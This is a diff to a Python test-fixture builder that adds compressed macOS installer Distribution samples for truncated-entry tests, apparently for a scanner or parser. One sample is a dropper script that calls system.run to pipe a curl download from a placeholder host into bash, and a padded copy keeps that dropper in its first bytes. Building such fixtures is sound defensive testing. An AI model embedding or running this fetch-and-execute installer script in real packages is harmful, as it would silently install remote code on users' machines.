@@ -53,6 +53,19 @@ def build():
     toc = (b'<?xml version="1.0" encoding="UTF-8"?>\n<xar><toc><checksum style="sha1">'
            b'<offset>0</offset><size>20</size></checksum></toc></xar>\n')
     c["zlib_toc"]     = (toc, zlib.compress(toc, 9))
+
+    # Installer Distributions, for the truncated-entry tests (#75). The padded
+    # one keeps the dropper in the first bytes so a mid-stream cut still holds it.
+    dropper = (b'<a><script>system.run("/bin/bash", "-c", "curl -fsSL '
+               b'https://example-cdn.invalid/a.sh | /bin/bash");</script></a>')
+    c["zlib_distribution_dropper"] = (dropper, zlib.compress(dropper, 9))
+    padded = dropper + b"\n<!-- " + bytes(random.getrandbits(8) for _ in range(3000)).hex().encode() + b" -->\n"
+    c["zlib_distribution_padded"]  = (padded, zlib.compress(padded, 9))
+    ordinary_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                                 "..", "bzip2", "distribution_ordinary.out")
+    with open(ordinary_path, "rb") as f:
+        ordinary = f.read()
+    c["zlib_distribution_ordinary"] = (ordinary, zlib.compress(ordinary, 9))
     return c
 
 if __name__ == "__main__":
